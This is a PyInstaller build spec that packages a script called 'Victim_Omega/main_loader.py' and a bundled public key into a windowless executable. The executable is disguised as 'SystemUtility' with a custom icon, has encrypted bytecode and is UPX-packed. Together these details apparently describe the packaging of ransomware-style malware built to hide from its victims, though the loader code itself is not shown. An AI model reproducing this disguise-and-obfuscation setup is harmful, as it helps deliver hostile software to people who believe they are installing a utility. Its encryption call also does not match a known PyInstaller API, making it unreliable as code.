# -*- mode: python ; coding: utf-8 -*-

block_cipher = pyi_crypto.PyInstallerCrypto('YourStrongEncryptionKeyHere!')

a = Analysis(
    ['Victim_Omega/main_loader.py'],
    pathex=[],
    binaries=[],
    datas=[
        ('Victim_Omega/data/public.pem', 'data'),
        # You can add other data files here
    ],
    hiddenimports=[],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)                                   # مزال تتعاود so dont worry 

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='SystemUtility',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # Set to True if you want to see the console window
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='icon.ico'  # Optionally, set an icon
)